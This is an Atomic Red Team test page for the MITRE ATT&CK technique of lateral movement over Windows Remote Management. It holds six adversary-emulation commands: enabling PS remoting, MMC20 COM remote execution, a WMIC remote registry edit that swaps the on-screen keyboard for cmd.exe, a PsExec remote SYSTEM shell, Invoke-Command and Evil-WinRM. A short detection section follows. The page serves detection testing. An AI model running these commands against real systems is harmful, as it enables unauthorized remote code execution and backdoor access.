# T1021.006 - Remote Services: Windows Remote Management
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Enable Windows Remote Management
Powershell Enable WinRM

Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Enable-PSRemoting -Force
```

Invoke-AtomicTest T1021.006 -TestNumbers 1

### Atomic Test #2 - PowerShell Lateral Movement
Powershell lateral movement using the mmc20 application com object.

Reference:

https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/

Upon successful execution, cmd will spawn calc.exe on a remote computer.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
```

Invoke-AtomicTest T1021.006 -TestNumbers 2

### Atomic Test #3 - WMIC Process Call Create
Utilize WMIC to start remote process.

Upon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
```

Invoke-AtomicTest T1021.006 -TestNumbers 3

### Atomic Test #4 - Psexec
Utilize psexec to start remote process.

Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
#{psexec_exe} \\#{computer_name} -accepteula -u #{user_name} -p #{password} -s cmd.exe
```

Invoke-AtomicTest T1021.006 -TestNumbers 4

### Atomic Test #5 - Invoke-Command
Execute Invoke-command on remote host.

Upon successful execution, powershell will execute ipconfig on localhost using `invoke-command`.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
```

Invoke-AtomicTest T1021.006 -TestNumbers 5

### Atomic Test #6 - WinRM Access with Evil-WinRM
An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled
**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
evil-winrm -i #{destination_address} -u #{user_name} -p #{password}```

Invoke-AtomicTest T1021.006 -TestNumbers 6

## Detection
Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement)